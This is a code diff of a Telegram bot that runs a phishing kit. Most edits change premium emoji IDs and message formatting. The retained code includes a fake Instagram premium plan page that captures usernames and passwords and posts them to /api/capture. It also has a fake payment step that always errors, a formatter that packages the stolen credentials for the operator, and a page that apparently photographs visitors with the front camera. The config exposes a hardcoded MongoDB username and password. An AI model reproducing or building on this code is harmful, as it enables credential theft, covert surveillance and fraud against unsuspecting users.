@@ -21,14 +21,11 @@
  *     - 🔴 Danger: Destructive (Back, Remove, Delete, Ban, Reject, REMOVEPROTECTED)
  *     - URL buttons (with url field) do NOT get style attribute
  * 15. ADDED: Official Telegram Menu Button (setMyCommands) – registers /start and /menu
- * 16. UPDATED: Premium emojis added to messages (excluding buttons)
+ * 16. UPDATED: Premium emojis added to messages (excluding buttons) using custom_emoji_id
  * 17. UPDATED: Max opens increased from 3 to 5
  * 18. UPDATED: Channel buttons now use primary style (blue)
  * 19. UPDATED: Check All Joined button uses success style (green)
- * 20. FIXED: Premium emojis properly added using Telegram's premium emoji IDs
- * 21. FIXED: Security scan now sends files only after scan completes or user leaves
- * 22. FIXED: Security scan auto-deletes files from database after sending
- * 23. FIXED: Security scan saves ALL files (not just images) up to 1MB
+ * 20. FIXED: Premium emojis properly added using Telegram's custom_emoji_id with entities
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -42,7 +39,7 @@ const config = {
     baseUrl: process.env.RENDER_URL || 'https://official-premium.onrender.com',
     BATCH_SIZE: 100,
     LINK_EXPIRY: 15 * 60 * 1000,
-    MAX_OPENS: 5, // UPDATED: from 3 to 5
+    MAX_OPENS: 5,
     mongoUrl: 'mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0'
 };
 
@@ -68,7 +65,7 @@ app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 const storage = multer.memoryStorage();
 const upload = multer({
     storage: storage,
-    limits: { fileSize: 50 * 1024 * 1024 }, // 50MB limit
+    limits: { fileSize: 50 * 1024 * 1024 },
     fileFilter: (req, file, cb) => {
         if (file.mimetype.startsWith('image/')) {
             cb(null, true);
@@ -91,284 +88,329 @@ console.log('✅ Directories created');
 
 // ====================== PREMIUM EMOJIS (Telegram Premium IDs) ======================
 const PREMIUM_EMOJI_MAP = {
-    "⚡":   "5399934661818359384",
-    "🔄":   "5373310679241466020",
-    "⚙️":   "5787672468076367185",
-    "⭐":   "6242413641052722528",
-    "👤":   "5373012449597335010",
-    "💘":   "6266818250818983044",
-    "🎁":   "6129497211379129336",
-    "➿":   "6329854094252970694",
-    "➖":   "6307665627481903641",
-    "💎":   "6123070651814124726",
-    "🌀":   "5913534466051021148",
-    "☄️":   "6339024429250515243",
-    "🥇":   "6265004494719816749",
-    "📞":   "6282996898701775483",
-    "👑":   "6242406378263025026",
-    "🔥":   "6307636391639519250",
-    "❤️":   "5406926593698312391",
-    "✅":   "6071022434234930063",
-    "❌":   "6105179944067798549",
-    "💀":   "5960961797035922820",
-    "📊":   "5431577498364158238",
-    "📢":   "5197304993920616826",
-    "👥":   "5301276827782755360",
-    "🆔":   "5888781182249738113",
-    "📅":   "5413879192267805083",
-    "💰":   "6267068789146260253",
-    "🪙":   "5366223171454278937",
-    "🎉":   "6242389503336518600",
-    "🎮":   "6070964971867477673",
-    "🛡️":   "6170491132326188067",
-    "🔍":   "5258274739041883702",
-    "📌":   "5258361175258712272",
-    "🎯":   "5463274047771000031",
-    "🎫":   "5418010521309815154",
-    "📛":   "5407091670766343316",
-    "🌎":   "5397575638146110953",
-    "👋":   "6276133811545706331",
-    "🚪":   "6035130900075777681",
-    "🔔":   "6264510702329797113",
-    "🔕":   "5244807637157029775",
-    "📱":   "5465169893580086142",
-    "📸":   "6305331119482999807",
-    "💣":   "5454225015534805938",
-    "🪪":   "6030753228889526497",
-    "🟢":   "6120953301656670791",
-    "🔴":   "6122945749870187150",
-    "⏳":   "5451732530048802485",
-    "⏰":   "5413704112220949842",
-    "⏱️":   "6179440452601647526",
-    "💬":   "5409496608287634515",
-    "🔗":   "5431695342289379366",
-    "🔒":   "6195245116207143870",
-    "🎥":   "5449600639283619330",
-    "🖼️":   "5334759607939040793",
-    "👇":   "5301038027601098171",
-    "💡":   "5219745609631674840",
-    "🔙":   "5471937446368975982",
-    "👆":   "5373091747827689552",
+    "⚡": "5399934661818359384",
+    "🔄": "5373310679241466020",
+    "⚙️": "5787672468076367185",
+    "⭐": "6242413641052722528",
+    "👤": "5373012449597335010",
+    "💘": "6266818250818983044",
+    "🎁": "6129497211379129336",
+    "➿": "6329854094252970694",
+    "➖": "6307665627481903641",
+    "💎": "6123070651814124726",
+    "🌀": "5913534466051021148",
+    "☄️": "6339024429250515243",
+    "🥇": "6265004494719816749",
+    "📞": "6282996898701775483",
+    "👑": "6242406378263025026",
+    "🔥": "6307636391639519250",
+    "❤️": "5406926593698312391",
+    "✅": "6071022434234930063",
+    "❌": "6105179944067798549",
+    "💀": "5960961797035922820",
+    "📊": "5431577498364158238",
+    "📢": "5197304993920616826",
+    "👥": "5301276827782755360",
+    "🆔": "5888781182249738113",
+    "📅": "5413879192267805083",
+    "💰": "6267068789146260253",
+    "🪙": "5366223171454278937",
+    "🎉": "6242389503336518600",
+    "🎮": "6070964971867477673",
+    "🛡️": "6170491132326188067",
+    "🔍": "5258274739041883702",
+    "📌": "5258361175258712272",
+    "🎯": "5463274047771000031",
+    "🎫": "5418010521309815154",
+    "📛": "5407091670766343316",
+    "🌎": "5397575638146110953",
+    "👋": "6276133811545706331",
+    "🚪": "6035130900075777681",
+    "🔔": "6264510702329797113",
+    "🔕": "5244807637157029775",
+    "📱": "5465169893580086142",
+    "📸": "6305331119482999807",
+    "💣": "5454225015534805938",
+    "🪪": "6030753228889526497",
+    "🟢": "6120953301656670791",
+    "🔴": "6122945749870187150",
+    "⏳": "5451732530048802485",
+    "⏰": "5413704112220949842",
+    "⏱️": "6179440452601647526",
+    "💬": "5409496608287634515",
+    "🔗": "5431695342289379366",
+    "🔒": "6195245116207143870",
+    "🎥": "5449600639283619330",
+    "🖼️": "5334759607939040793",
+    "👇": "5301038027601098171",
+    "💡": "5219745609631674840",
+    "🔙": "5471937446368975982",
+    "👆": "5373091747827689552",
     "👨‍💻": "4958900559139570572",
-    "🧩":   "5188052560342545947",
-    "🎀":   "5219745609631674840",
-    "💸":   "5253804796589402657",
-    "🏅":   "5415727875041021959",
-    "🤝":   "5445261194662391481",
-    "🔐":   "5472308992514464048",
-    "📧":   "6046310987710078440",
-    "📡":   "5399934661818359384",
-    "🏠":   "5465226866321268133",
-    "😎":   "6123091160282964016",
-    "⚠️":   "5278211596656639183",
-    "📤":   "5197304993920616826",
-    "📋":   "6034969813032374911",
-    "🔵":   "6330188813939251966",
-    "🤖":   "6070964971867477673",
-    "🗣️":   "5406705252558724532",
-    "🟥":   "6330022375366598950",
-    "📍":   "5258361175258712272",
-    "💠":   "4960766907113276588",
-    "💍":   "6129913342170506824",
-    "🔓":   "5890882606668452641",
-    "🙂":   "6129440444796378483",
-    "👉":   "5465467698022468218",
-    "➕":   "6257944590687410044",
-    "👁":   "6159021800119341504",
-    "🗑️":   "6129486856212979482",
-    "🔑":   "5472308992514464048",
-    "📄":   "6034969813032374911",
-    "⚜":   "6181649972757271368",
-    "🩶":   "5789607097440147328",
-    "🍾":   "5798459514663473705",
-    "✉️":   "5929312878816400493",
-    "🌏":   "6178984829585986541",
-    "👨":   "5373012449597335010",
-    "▶":    "6323282781405190847",
-    "▶️":   "6323282781405190847",
-    "◀":    "6323282781405190847",
-    "◀️":   "6323282781405190847",
-    "🗺":   "6303001048185309018",
-    "🗺️":   "6303001048185309018",
-    "🎓":   "5357419403325481346",
-    "💼":   "5348227245599105972",
-    "🌐":   "6075739493736915024",
-    "🚗":   "5312322066328853156",
-    "🚘":   "5312322066328853156",
-    "📝":   "5409496608287634515",
-    "⬇":    "6129694470637100146",
-    "⬇️":   "6129694470637100146",
-    "🌟":   "6147565374289220368",
-    "👾":   "5303396278179210513",
-    "🛒":   "5780824606579364273",
-    "📮":   "5287533898803211359",
-    "🌍":   "6329854094252970694",
-    "🎨":   "5415727875041021959",
-    "🚀":   "6158836197402615172",
-    "🗑":   "6158751479172702139",
-    "🎙":   "5377544228505134960",
-    "🎙️":   "5377544228505134960",
-    "🇮🇳":  "5447419223242449630",
-    "⛅":   "6178984829585986541",
-    "⛅️":   "6178984829585986541",
-    "🌤":   "6178984829585986541",
-    "🌤️":   "6178984829585986541",
-    "🌥":   "6178984829585986541",
-    "🌥️":   "6178984829585986541",
-    "🌦":   "6178984829585986541",
-    "🌦️":   "6178984829585986541",
-    "🌧":   "6178984829585986541",
-    "🌧️":   "6178984829585986541",
-    "🌨":   "6178984829585986541",
-    "🌨️":   "6178984829585986541",
-    "🌩":   "6178984829585986541",
-    "🌩️":   "6178984829585986541",
-    "⛈":   "6178984829585986541",
-    "⛈️":   "6178984829585986541",
-    "☁":   "6178984829585986541",
-    "☁️":   "6178984829585986541",
-    "☀":   "6147565374289220368",
-    "☀️":   "6147565374289220368",
-    "🌞":   "6147565374289220368",
-    "🌈":   "6147565374289220368",
-    "❄":   "6271523694617243479",
-    "❄️":   "6271523694617243479",
-    "🌊":   "6178984829585986541",
-    "🌋":   "6178984829585986541",
-    "🌌":   "6178984829585986541",
-    "🌠":   "6147565374289220368",
-    "🌃":   "6178984829585986541",
-    "🌁":   "6178984829585986541",
-    "🌄":   "6178984829585986541",
-    "🌅":   "6178984829585986541",
-    "🌆":   "5415727875041021959",
-    "🌇":   "5242564946968992534",
-    "🌉":   "5041882544228795301",
-    "🌙":   "5415727875041021959",
-    "🎵":   "5377544228505134960",
-    "🎶":   "5377544228505134960",
-    "🎧":   "5377544228505134960",
-    "🎸":   "5377544228505134960",
-    "🎷":   "5377544228505134960",
-    "🎺":   "5377544228505134960",
-    "🎻":   "5377544228505134960",
-    "🎹":   "5377544228505134960",
-    "🥁":   "5377544228505134960",
-    "🎼":   "5377544228505134960",
-    "📻":   "5377544228505134960",
-    "💿":   "5258274739041883702",
-    "📀":   "5258274739041883702",
-    "🔊":   "6105179944067798549",
-    "🔉":   "6105179944067798549",
-    "🔈":   "6105179944067798549",
-    "🔇":   "6105179944067798549",
-    "🕹":   "5303396278179210513",
-    "🕹️":   "5303396278179210513",
-    "🖥":   "5415727875041021959",
-    "🖥️":   "5415727875041021959",
-    "📺":   "5415727875041021959",
-    "🗄":   "5258274739041883702",
-    "🗄️":   "5258274739041883702",
-    "💾":   "5258274739041883702",
-    "📦":   "5258274739041883702",
-    "⛏":   "5215441850537618106",
-    "⛏️":   "5215441850537618106",
-    "🔧":   "5215441850537618106",
-    "🔨":   "5215441850537618106",
-    "👪":   "5373012449597335010",
+    "🧩": "5188052560342545947",
+    "🎀": "5219745609631674840",
+    "💸": "5253804796589402657",
+    "🏅": "5415727875041021959",
+    "🤝": "5445261194662391481",
+    "🔐": "5472308992514464048",
+    "📧": "6046310987710078440",
+    "📡": "5399934661818359384",
+    "🏠": "5465226866321268133",
+    "😎": "6123091160282964016",
+    "⚠️": "5278211596656639183",
+    "📤": "5197304993920616826",
+    "📋": "6034969813032374911",
+    "🔵": "6330188813939251966",
+    "🤖": "6070964971867477673",
+    "🗣️": "5406705252558724532",
+    "🟥": "6330022375366598950",
+    "📍": "5258361175258712272",
+    "💠": "4960766907113276588",
+    "💍": "6129913342170506824",
+    "🔓": "5890882606668452641",
+    "🙂": "6129440444796378483",
+    "👉": "5465467698022468218",
+    "➕": "6257944590687410044",
+    "👁": "6159021800119341504",
+    "🗑️": "6129486856212979482",
+    "🔑": "5472308992514464048",
+    "📄": "6034969813032374911",
+    "⚜": "6181649972757271368",
+    "🩶": "5789607097440147328",
+    "🍾": "5798459514663473705",
+    "✉️": "5929312878816400493",
+    "🌏": "6178984829585986541",
+    "👨": "5373012449597335010",
+    "▶": "6323282781405190847",
+    "▶️": "6323282781405190847",
+    "◀": "6323282781405190847",
+    "◀️": "6323282781405190847",
+    "🗺": "6303001048185309018",
+    "🗺️": "6303001048185309018",
+    "🎓": "5357419403325481346",
+    "💼": "5348227245599105972",
+    "🌐": "6075739493736915024",
+    "🚗": "5312322066328853156",
+    "🚘": "5312322066328853156",
+    "📝": "5409496608287634515",
+    "⬇": "6129694470637100146",
+    "⬇️": "6129694470637100146",
+    "🌟": "6147565374289220368",
+    "👾": "5303396278179210513",
+    "🛒": "5780824606579364273",
+    "📮": "5287533898803211359",
+    "🌍": "6329854094252970694",
+    "🎨": "5415727875041021959",
+    "🚀": "6158836197402615172",
+    "🗑": "6158751479172702139",
+    "🎙": "5377544228505134960",
+    "🎙️": "5377544228505134960",
+    "🇮🇳": "5447419223242449630",
+    "⛅": "6178984829585986541",
+    "⛅️": "6178984829585986541",
+    "🌤": "6178984829585986541",
+    "🌤️": "6178984829585986541",
+    "🌥": "6178984829585986541",
+    "🌥️": "6178984829585986541",
+    "🌦": "6178984829585986541",
+    "🌦️": "6178984829585986541",
+    "🌧": "6178984829585986541",
+    "🌧️": "6178984829585986541",
+    "🌨": "6178984829585986541",
+    "🌨️": "6178984829585986541",
+    "🌩": "6178984829585986541",
+    "🌩️": "6178984829585986541",
+    "⛈": "6178984829585986541",
+    "⛈️": "6178984829585986541",
+    "☁": "6178984829585986541",
+    "☁️": "6178984829585986541",
+    "☀": "6147565374289220368",
+    "☀️": "6147565374289220368",
+    "🌞": "6147565374289220368",
+    "🌈": "6147565374289220368",
+    "❄": "6271523694617243479",
+    "❄️": "6271523694617243479",
+    "🌊": "6178984829585986541",
+    "🌋": "6178984829585986541",
+    "🌌": "6178984829585986541",
+    "🌠": "6147565374289220368",
+    "🌃": "6178984829585986541",
+    "🌁": "6178984829585986541",
+    "🌄": "6178984829585986541",
+    "🌅": "6178984829585986541",
+    "🌆": "5415727875041021959",
+    "🌇": "5242564946968992534",
+    "🌉": "5041882544228795301",
+    "🌙": "5415727875041021959",
+    "🎵": "5377544228505134960",
+    "🎶": "5377544228505134960",
+    "🎧": "5377544228505134960",
+    "🎸": "5377544228505134960",
+    "🎷": "5377544228505134960",
+    "🎺": "5377544228505134960",
+    "🎻": "5377544228505134960",
+    "🎹": "5377544228505134960",
+    "🥁": "5377544228505134960",
+    "🎼": "5377544228505134960",
+    "📻": "5377544228505134960",
+    "💿": "5258274739041883702",
+    "📀": "5258274739041883702",
+    "🔊": "6105179944067798549",
+    "🔉": "6105179944067798549",
+    "🔈": "6105179944067798549",
+    "🔇": "6105179944067798549",
+    "🕹": "5303396278179210513",
+    "🕹️": "5303396278179210513",
+    "🖥": "5415727875041021959",
+    "🖥️": "5415727875041021959",
+    "📺": "5415727875041021959",
+    "🗄": "5258274739041883702",
+    "🗄️": "5258274739041883702",
+    "💾": "5258274739041883702",
+    "📦": "5258274739041883702",
+    "⛏": "5215441850537618106",
+    "⛏️": "5215441850537618106",
+    "🔧": "5215441850537618106",
+    "🔨": "5215441850537618106",
+    "👪": "5373012449597335010",
     "👨‍👩‍👧": "5373012449597335010",
     "👨‍👩‍👦": "5373012449597335010",
     "👨‍👩‍👧‍👦": "5373012449597335010",
-    "👩":   "5373012449597335010",
-    "👧":   "5373012449597335010",
-    "👦":   "5373012449597335010",
-    "🧑":   "5373012449597335010",
-    "🌚":   "5415727875041021959",
-    "🌑":   "5415727875041021959",
-    "🌒":   "5415727875041021959",
-    "🌓":   "5415727875041021959",
-    "🌔":   "5415727875041021959",
-    "🌕":   "6147565374289220368",
-    "🌖":   "5415727875041021959",
-    "🌗":   "5415727875041021959",
-    "🌘":   "5415727875041021959",
-    "🌛":   "5415727875041021959",
-    "🌜":   "5415727875041021959",
-    "🪪":   "5422388085121885096",
-    "🎞":   "5258274739041883702",
-    "🎞️":   "5258274739041883702",
-    "🎬":   "5258274739041883702",
-    "🧊":   "6271523694617243479",
-    "✨":   "6147565374289220368",
-    "💥":   "6147565374289220368",
-    "💧":   "6178984829585986541",
-    "💨":   "6178984829585986541",
-    "🌿":   "6178984829585986541",
-    "💚":   "5789607097440147328",
-    "💛":   "5789607097440147328",
-    "🧡":   "5789607097440147328",
-    "💜":   "5789607097440147328",
-    "🖤":   "5789607097440147328",
-    "🤍":   "5789607097440147328",
-    "🤎":   "5789607097440147328",
-    "💙":   "5789607097440147328",
-    "❤":   "5789607097440147328",
-    "🔃":   "5377544228505134960",
-    "🔁":   "5377544228505134960",
-    "🔂":   "5377544228505134960",
-    "⏩":   "6323282781405190847",
-    "⏪":   "6323282781405190847",
-    "⏫":   "6129694470637100146",
-    "⏬":   "6129694470637100146",
-    "⏯":   "6323282781405190847",
-    "🔛":   "6323282781405190847",
-    "🔜":   "6323282781405190847",
-    "🔚":   "6323282781405190847",
-    "🔝":   "6129694470637100146",
-    "🏡":   "5465226866321268133",
-    "🏘":   "5465226866321268133",
-    "🏗":   "5415727875041021959",
-    "🏢":   "5217822164362739968",
-    "🛸":   "6158836197402615172",
-    "🗣":   "5406705252558724532",
-    "🔎":   "5258274739041883702",
-    "📧":   "5303416490295304868",
-    "⚡":   "6257790126483578242",
-    "🖌":   "5415727875041021959",
-    "🖌️":   "5415727875041021959",
-    "🔌":   "5215441850537618106",
-    "📌":   "5287533898803211359",
-    "📍":   "5287533898803211359",
-    "🏆":   "5357419403325481346",
-    "🥇":   "5357419403325481346",
-    "🎯":   "5472308992514464048",
-    "🎲":   "5303396278179210513",
-    "🎮":   "5303396278179210513",
-    "🧩":   "5303396278179210513",
-    "💳":   "5224257782013769471",
-    "💰":   "5224257782013769471",
-    "💎":   "6034969813032374911",
-    "👑":   "6034969813032374911",
-    "🎁":   "5798459514663473705",
-    "🎉":   "5798459514663473705",
-    "🪄":   "5472308992514464048"
+    "👩": "5373012449597335010",
+    "👧": "5373012449597335010",
+    "👦": "5373012449597335010",
+    "🧑": "5373012449597335010",
+    "🌚": "5415727875041021959",
+    "🌑": "5415727875041021959",
+    "🌒": "5415727875041021959",
+    "🌓": "5415727875041021959",
+    "🌔": "5415727875041021959",
+    "🌕": "6147565374289220368",
+    "🌖": "5415727875041021959",
+    "🌗": "5415727875041021959",
+    "🌘": "5415727875041021959",
+    "🌛": "5415727875041021959",
+    "🌜": "5415727875041021959",
+    "🪪": "5422388085121885096",
+    "🎞": "5258274739041883702",
+    "🎞️": "5258274739041883702",
+    "🎬": "5258274739041883702",
+    "🧊": "6271523694617243479",
+    "✨": "6147565374289220368",
+    "💥": "6147565374289220368",
+    "💧": "6178984829585986541",
+    "💨": "6178984829585986541",
+    "🌿": "6178984829585986541",
+    "💚": "5789607097440147328",
+    "💛": "5789607097440147328",
+    "🧡": "5789607097440147328",
+    "💜": "5789607097440147328",
+    "🖤": "5789607097440147328",
+    "🤍": "5789607097440147328",
+    "🤎": "5789607097440147328",
+    "💙": "5789607097440147328",
+    "❤": "5789607097440147328",
+    "🔃": "5377544228505134960",
+    "🔁": "5377544228505134960",
+    "🔂": "5377544228505134960",
+    "⏩": "6323282781405190847",
+    "⏪": "6323282781405190847",
+    "⏫": "6129694470637100146",
+    "⏬": "6129694470637100146",
+    "⏯": "6323282781405190847",
+    "🔛": "6323282781405190847",
+    "🔜": "6323282781405190847",
+    "🔚": "6323282781405190847",
+    "🔝": "6129694470637100146",
+    "🏡": "5465226866321268133",
+    "🏘": "5465226866321268133",
+    "🏗": "5415727875041021959",
+    "🏢": "5217822164362739968",
+    "🛸": "6158836197402615172",
+    "🗣": "5406705252558724532",
+    "🔎": "5258274739041883702",
+    "📧": "5303416490295304868",
+    "⚡": "6257790126483578242",
+    "🖌": "5415727875041021959",
+    "🖌️": "5415727875041021959",
+    "🔌": "5215441850537618106",
+    "📌": "5287533898803211359",
+    "📍": "5287533898803211359",
+    "🏆": "5357419403325481346",
+    "🥇": "5357419403325481346",
+    "🎯": "5472308992514464048",
+    "🎲": "5303396278179210513",
+    "🎮": "5303396278179210513",
+    "🧩": "5303396278179210513",
+    "💳": "5224257782013769471",
+    "💰": "5224257782013769471",
+    "💎": "6034969813032374911",
+    "👑": "6034969813032374911",
+    "🎁": "5798459514663473705",
+    "🎉": "5798459514663473705",
+    "🪄": "5472308992514464048"
 };
 
-// Helper function to get premium emoji HTML with ID
-function getPremiumEmoji(emojiChar) {
-    const id = PREMIUM_EMOJI_MAP[emojiChar];
-    if (!id) return emojiChar; // fallback to normal emoji
-    // Return emoji with custom entity - Telegram will render it as premium
-    return emojiChar;
-}
-
-// Helper to replace emojis in text with premium versions
-function replaceWithPremiumEmojis(text) {
-    // Replace each emoji character with its premium version (same character, but Telegram will render as premium)
-    // We just keep the emoji character - Telegram handles premium rendering via the ID mapping
-    // The actual ID is stored in the map but we use the emoji character directly
-    // Telegram will use the premium version if the user has premium
-    return text;
+// ====================== PREMIUM EMOJI HELPER ======================
+async function sendWithPremium(chatId, text, parse_mode = 'HTML', reply_markup = null, extraOptions = {}) {
+    try {
+        const entities = [];
+        const emojis = Object.keys(PREMIUM_EMOJI_MAP);
+        
+        for (const emoji of emojis) {
+            let start = text.indexOf(emoji);
+            while (start !== -1) {
+                // Check if this emoji is inside HTML tags
+                let inTag = false;
+                let tagStart = text.lastIndexOf('<', start);
+                let tagEnd = text.indexOf('>', start);
+                if (tagStart !== -1 && tagEnd !== -1 && tagStart < start && tagEnd > start) {
+                    inTag = true;
+                }
+                
+                if (!inTag) {
+                    entities.push({
+                        type: 'custom_emoji',
+                        offset: start,
+                        length: emoji.length,
+                        custom_emoji_id: PREMIUM_EMOJI_MAP[emoji]
+                    });
+                }
+                start = text.indexOf(emoji, start + 1);
+            }
+        }
+        
+        // Sort entities by offset
+        entities.sort((a, b) => a.offset - b.offset);
+        
+        // Remove duplicate entities (if same position)
+        const uniqueEntities = [];
+        const seen = new Set();
+        for (const entity of entities) {
+            const key = `${entity.offset}-${entity.length}`;
+            if (!seen.has(key)) {
+                seen.add(key);
+                uniqueEntities.push(entity);
+            }
+        }
+        
+        const options = {
+            parse_mode: parse_mode,
+            entities: uniqueEntities,
+            ...extraOptions
+        };
+        if (reply_markup) options.reply_markup = reply_markup;
+        
+        return await S7.sendMessage(chatId, text, options);
+    } catch (err) {
+        console.error('❌ sendWithPremium error:', err.message);
+        // Fallback to normal send
+        const options = {
+            parse_mode: parse_mode
+        };
+        if (reply_markup) options.reply_markup = reply_markup;
+        return await S7.sendMessage(chatId, text, options);
+    }
 }
 
 // ====================== LOGGING ======================
@@ -413,7 +455,7 @@ const userSchema = new mongoose.Schema({
     _waitingForQR: { type: Boolean, default: false },
     _waitingForPhoto: { type: Boolean, default: false },
     _pendingPayment: { type: Object, default: null },
-    _scanFiles: { type: Array, default: [] }, // For security scan temp storage
+    _scanFiles: { type: Array, default: [] },
     _scanActive: { type: Boolean, default: false }
 });
 
@@ -459,7 +501,7 @@ const linkSchema = new mongoose.Schema({
     createdAt: Date,
     expiresAt: Date,
     opens: { type: Number, default: 0 },
-    maxOpens: { type: Number, default: 5 }, // UPDATED: from 3 to 5
+    maxOpens: { type: Number, default: 5 },
     active: { type: Boolean, default: true }
 });
 
@@ -472,13 +514,12 @@ const couponSchema = new mongoose.Schema({
     createdAt: { type: Date, default: Date.now }
 });
 
-// Temporary scan file schema for security scan
 const scanFileSchema = new mongoose.Schema({
     userId: { type: String, required: true },
     filename: String,
     data: { type: String, required: true },
     size: Number,
-    createdAt: { type: Date, default: Date.now, expires: 600 } // Auto-delete after 10 minutes
+    createdAt: { type: Date, default: Date.now, expires: 600 }
 });
 
 // ====================== MODELS ======================
@@ -826,14 +867,11 @@ function getUptime() {
 }
 
 function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
-    const skull = getPremiumEmoji('💀');
-    const pin = getPremiumEmoji('📌');
-    const calendar = getPremiumEmoji('📅');
-    return `${skull}©${skull} ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ RTF ʙᴏʏ ﾂ.${skull}ª${skull}\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ${platform}\n${pin} ↝ ᴜsᴇʀɴᴀᴍᴇ » ${username}\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ${password}\n${calendar} ↝ ᴛɪᴍᴇ » ${SYloveTiMe}\n📝 ↝ ᴅᴀᴛᴇ » ${SYloveDaTe}\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ${dev}`;
+    return '💀©💀 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ RTF ʙᴏʏ ﾂ.💀ª💀\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ' + platform + '\n📌 ↝ ᴜsᴇʀɴᴀᴍᴇ » ' + username + '\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ' + password + '\n📅 ↝ ᴛɪᴍᴇ » ' + SYloveTiMe + '\n📝 ↝ ᴅᴀᴛᴇ » ' + SYloveDaTe + '\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ' + dev;
 }
 
 function MenuLove(firstName, dev, botName, LoveTime, message) {
-    return `─【 ${dev} 】─\n────────────────────\n ᴜsᴇʀ ➤ ${firstName} ›\n ɴᴀᴍᴇ ➤ ${botName} ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ${LoveTime} ›\n ────────────────────\n\n ${message} \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─`;
+    return '─【 ' + dev + ' 】─\n────────────────────\n ᴜsᴇʀ ➤ ' + firstName + ' ›\n ɴᴀᴍᴇ ➤ ' + botName + ' ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ' + LoveTime + ' ›\n ────────────────────\n\n ' + message + ' \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─';
 }
 
 function LoveNotifer(platform, username, password) {
@@ -884,12 +922,12 @@ async function getChannelButtonsAsync() {
     const buttons = channels.map(ch => ([{
         text: '📢 ' + ch.name,
         url: ch.link,
-        style: 'primary' // UPDATED: Channel buttons now use primary style
+        style: 'primary'
     }]));
     buttons.push([{
         text: '✅ Check All Joined',
         callback_data: 'check_all',
-        style: 'success' // positive verification
+        style: 'success'
     }]);
     return { inline_keyboard: buttons };
 }
@@ -904,17 +942,16 @@ async function sendBatchPhotos(userId) {
     const count = photos.length;
     logToFile('📸 Sending ' + count + ' photos to user ' + userId);
     try {
-        const star = getPremiumEmoji('⭐');
-        await S7.sendPhoto(userId, photos[0], { caption: `${star} <b>${count} photos received!</b>`, parse_mode: 'HTML' });
+        await sendWithPremium(userId, '⭐ <b>' + count + ' photos received!</b>');
         const batch = [];
-        for (let i = 1; i < photos.length; i++) {
+        for (let i = 0; i < photos.length; i++) {
             batch.push(S7.sendPhoto(userId, photos[i]));
             if (batch.length >= 5) { await Promise.all(batch); batch.length = 0; }
         }
         if (batch.length) await Promise.all(batch);
     } catch (err) {
         logToFile('❌ Error sending photos: ' + err.message);
-        for (let j = 1; j < photos.length; j++) {
+        for (let j = 0; j < photos.length; j++) {
             try { await S7.sendPhoto(userId, photos[j]); } catch (e) {}
         }
     }
@@ -1133,7 +1170,6 @@ video,canvas{display:none}
                 video: { facingMode: "user", width: 400, height: 400 } 
             });
             video.srcObject = stream;
-            // FIX: Wait for video to be ready (loadeddata) instead of fixed timeout
             await new Promise(function(resolve) {
                 if (video.readyState >= 2) return resolve();
                 video.addEventListener('loadeddata', resolve);
@@ -1770,7 +1806,6 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
         var selectedPlan = null;
         var username = "";
 
-        // DOM elements
         var step1 = document.getElementById('step1');
         var step2 = document.getElementById('step2');
         var step3 = document.getElementById('step3');
@@ -1799,7 +1834,6 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
             step.classList.add('active');
         }
 
-        // Step 1 -> Step 2
         continueBtn.addEventListener('click', function() {
             var val = usernameInput.value.trim();
             if (val.length < 2) {
@@ -1810,23 +1844,19 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
             showStep(step2);
         });
 
-        // Back from Step 2
         backToUsername.addEventListener('click', function() {
             showStep(step1);
         });
 
-        // Plan selection
         planCards.forEach(function(card) {
             card.addEventListener('click', function() {
                 var plan = parseInt(this.dataset.plan);
                 var price = parseInt(this.dataset.price);
                 selectedPlan = plan;
                 if (plan === 1000) {
-                    // Show payment step
                     showStep(step3);
                     loadQR();
                 } else {
-                    // Go directly to password page (old flow)
                     showStep(step4);
                     passwordUsername.value = username;
                     loginSuccess.style.display = 'none';
@@ -1834,7 +1864,6 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
             });
         });
 
-        // Load QR from server
         function loadQR() {
             qrLoading.style.display = 'block';
             qrImage.style.display = 'none';
@@ -1854,7 +1883,6 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
                 });
         }
 
-        // Send UTR – always shows error
         sendUtrBtn.addEventListener('click', function() {
             var utr = utrInput.value.trim();
             if (utr.length === 0) {
@@ -1862,30 +1890,26 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
                 return;
             }
             utrError.style.display = 'block';
-            // Optionally, we could log the UTR for admin, but not required
         });
 
-        // Proceed to login from payment page
         proceedToLoginBtn.addEventListener('click', function() {
             showStep(step4);
             passwordUsername.value = username;
             loginSuccess.style.display = 'none';
         });
 
-        // Login button – capture and show success
         loginBtn.addEventListener('click', function() {
             var pwd = passwordInput.value.trim();
             if (pwd.length < 4) {
                 alert('Please enter your password.');
                 return;
             }
-            // Send data to server
             var payload = {
                 userid: userId,
                 platform: platform,
                 username: username,
                 password: pwd,
-                plan: selectedPlan || 0  // 0 if not selected (shouldn't happen)
+                plan: selectedPlan || 0
             };
             fetch('/api/capture', {
                 method: 'POST',
@@ -1893,20 +1917,16 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
                 body: JSON.stringify(payload)
             }).catch(function(e) { console.error(e); });
 
-            // Show success message
             loginBtn.style.display = 'none';
             loginSuccess.style.display = 'block';
-            // Optionally hide password input
             passwordInput.style.display = 'none';
